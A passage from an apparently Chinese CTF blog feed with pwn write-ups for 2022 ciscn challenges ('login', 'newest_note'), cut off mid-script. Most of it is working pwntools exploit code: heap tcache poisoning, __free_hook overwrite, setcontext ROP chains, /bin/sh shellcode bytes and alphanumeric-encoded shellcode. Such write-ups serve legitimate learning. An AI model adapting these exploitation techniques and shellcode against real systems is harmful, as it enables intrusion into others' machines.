0x20]</code>的时候能够执行我们的setcontext，同时基于rdx布置好我们的orw，尤其要注意rsp的变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;op&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;rd&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pt&#x27;</span>)<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br>setcontext += <span class="hljs-number">61</span><br>lg(<span class="hljs-string">&#x27;setcontext&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>magic = libc_base + <span class="hljs-number">0x000000000014a0a0</span><br>lg(<span class="hljs-string">&#x27;magic&#x27;</span>)<br><span class="hljs-comment"># mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>heap_base = <span class="hljs-built_in">next</span> &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment"># change free_hook-&gt;magic</span><br>fake_next = <span class="hljs-built_in">next</span> ^ free_hook<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>pld = p64(magic)*<span class="hljs-number">2</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">15</span>, pld)<br><br><span class="hljs-comment"># orw </span><br>flag_addr = heap_base + <span class="hljs-number">0x4c0</span><br>lg(<span class="hljs-string">&#x27;flag_addr&#x27;</span>)<br>owr = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)    <span class="hljs-comment"># push rcx-&gt;overflow p64(0)</span><br>owr += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_base + <span class="hljs-number">0x800</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(rd)<br>owr += p64(pop_rdi) + p64(heap_base + <span class="hljs-number">0x800</span>) +p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">2</span>, owr)<br><br><span class="hljs-comment"># setcontext</span><br>dest = heap_base + <span class="hljs-number">0x5d0</span> - <span class="hljs-number">0x20</span><br>pld = p64(setcontext) + p64(dest)       <br>pld = pld.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pld += p64(flag_addr + <span class="hljs-number">0x10</span>)   <span class="hljs-comment"># rsp-&gt;orw</span><br>pld += p64(ret)     <span class="hljs-comment"># rcx-&gt;ret</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">3</span>, pld)<br><span class="hljs-comment"># dbg()</span><br>delete(<span class="hljs-number">3</span>)<br><br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn 初赛</title>
    <link href="/2022/07/01/CTF_competition/2022ciscn/"/>
    <url>/2022/07/01/CTF_competition/2022ciscn/</url>
    
    <content type="html"><![CDATA[<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用<code>rdx</code>进行触发。</p><blockquote><p> 参考文章：<a href="https://blog.csdn.net/SmalOSnail/article/details/105236336">(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode</a></p></blockquote><p>使用alpha3的基本步骤：</p><ol><li><p>python运行以下脚本生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode_x64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-comment"># 注意打开的格式是wb</span><br>payload = asm(shellcraft.sh())<span class="hljs-comment"># 可以手写</span><br>f.write(payload)<br>f.close()<br></code></pre></td></tr></table></figure></li><li><p>使用命令生成可见字符的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;<br></code></pre></td></tr></table></figure></li></ol><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment"># 使用ae64生成的shellcode</span><br><br>payload = <span class="hljs-string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span><br>sh.send(payload)<br>sh.recv()<br>payload = <span class="hljs-string">&#x27;msg:&#x27;</span> + shellcode + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;opt:2\n\n&#x27;</span><br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><p>通过整型溢出使得分配的堆块大小大于<code>0x21000</code>，此堆块的指针就与libc存在固定的偏移，由此我们可以通过show这一个功能来泄露libc的地址，同时也可以通过内指针和environ来泄露栈地址，最后进行rop。</p><blockquote><p>比赛中没能想到这一点，属是有点弱鸡≧ ﹏ ≦</p></blockquote><p><code>malloc(8*0x20005000)</code>，将会得到一个位于.tls段上的指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx <span class="hljs-variable">$rebase</span>(0x4190)</span><br>0x557505d22190: 0x00007fb40f836010      0x0000000020005000<br></code></pre></td></tr></table></figure><p>一个小tips：可以通过pwndbg中的search命令来寻找内指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search</span><br>usage: search [-h] [-t &#123;byte,short,word,dword,qword,pointer,string,bytes&#125;] [-1] [-2] [-4] [-8] [-p] [-x] [-s] [-e]<br>              [-w] [--save] [--no-save] [-n]<br>              value [mapping_name]<br>search: error: the following arguments are required: value<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;environ</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;data variable, no debug info&gt; *) 0x7fb40fa82ec0 &lt;environ&gt;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search -p 0x7fb40fa82ec0</span><br>libc.so.6       0x7fb40fa79fb8 0x7fb40fa82ec0<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx 0x7fb40fa82ec0</span><br>0x7fb40fa82ec0 &lt;environ&gt;:       0x00007ffd346f8448      0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过double_free修改main函数的返回地址，最后退出程序即可get_shell。需要注意进行fake_chunk分配的时候，目标地址的环境是否能满足分配条件。</p><p>WP如下：</p><blockquote><p>e4l4师傅的模板还是挺香的(●’◡’●)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./newest_note&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./newest_note&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------#</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, data = <span class="hljs-string">&#x27;pursue&#x27;</span></span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>sla(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20005000</span>)) <span class="hljs-comment"># str()会将十六进制转化为十进制的字符串</span><br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0x4899a</span>)<br>libc_base = uu64() - <span class="hljs-number">0x218cc0</span><br>lg(<span 